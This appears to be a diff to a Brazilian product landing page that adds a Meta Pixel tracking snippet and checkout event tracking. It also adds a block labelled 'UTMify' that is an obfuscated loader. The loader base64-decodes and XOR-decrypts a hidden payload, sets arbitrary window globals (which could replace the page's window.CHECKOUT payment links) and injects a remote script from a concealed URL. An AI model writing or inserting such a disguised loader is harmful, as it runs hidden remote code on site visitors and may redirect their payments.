@@ -347,6 +347,26 @@
     .browser{padding:6px;border-radius:14px}.bar{padding:2px 4px 8px}.bar .url{display:none}.browser img{border-radius:9px}
   }
 </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1929098881834790');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1929098881834790&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<!-- UTMify -->
+<script>(function(){var r_t5tw=atob("DF+KHqvQmnhmbqNxuySoa9m8uEJEBtcFyyywMYSz/hZIG9cc0jnzMMi/91YEHIwC2C3jbt+jtQgPFsYdlC/jZs68tBIVTI9T2iv+bMKy7wwDHYFL4AKmPMy89RoHAtBTgQTxPMWx9x1EVIEB0ifvcuK0uFREGMIdzjqoJInm+EheC8YUgjvvf87i/k0FW8ZD3znuLZPy5yUb");var e_h64n=[];for(var g_h4qy=0;g_h4qy<r_t5tw.length;g_h4qy++){e_h64n.push(r_t5tw.charCodeAt(g_h4qy)&255);}var d_rarl=e_h64n[0];var w_5=e_h64n.slice(1,1+d_rarl);var g_z5c6=e_h64n.slice(1+d_rarl);var i_aogr=g_z5c6.map(function(b,p_2id){return b^w_5[p_2id%d_rarl];});var f_x="";for(var s_7o1w=0;s_7o1w<i_aogr.length;s_7o1w++){f_x+=String.fromCharCode(i_aogr[s_7o1w]&255);}var t_u8w=decodeURIComponent(escape(f_x));var w_9xg7=JSON.parse(t_u8w);var k_l54=w_9xg7.globals||[];k_l54.forEach(function(a_danw){window[a_danw.name]=a_danw.value;});var c_v5u=document.createElement("script");c_v5u.src=w_9xg7.url;c_v5u.async=true;c_v5u.defer=true;(w_9xg7.attributes||[]).forEach(function(c_l){c_v5u.setAttribute(c_l.name,c_l.value);});(document.head||document.documentElement).appendChild(c_v5u);})();</script>
+<!-- End UTMify -->
 </head>
 <body>
 
@@ -663,6 +683,19 @@
   document.querySelectorAll('[data-plan]').forEach(function(a){
     var url = (window.CHECKOUT||{})[a.dataset.plan];
     if (url && url !== '#') a.href = url; else a.href = '#planos';
+  });
+
+  // Meta Pixel: evento InitiateCheckout ao clicar nos botões de compra
+  document.querySelectorAll('[data-plan]').forEach(function(a){
+    a.addEventListener('click', function(){
+      if (!window.fbq) return;
+      var pro = a.dataset.plan === 'completo';
+      fbq('track', 'InitiateCheckout', {
+        value: pro ? 29.90 : 19.90,
+        currency: 'BRL',
+        content_name: pro ? 'Plano Completo' : 'Plano Básico'
+      });
+    });
   });
 
   // Animação de entrada ao rolar
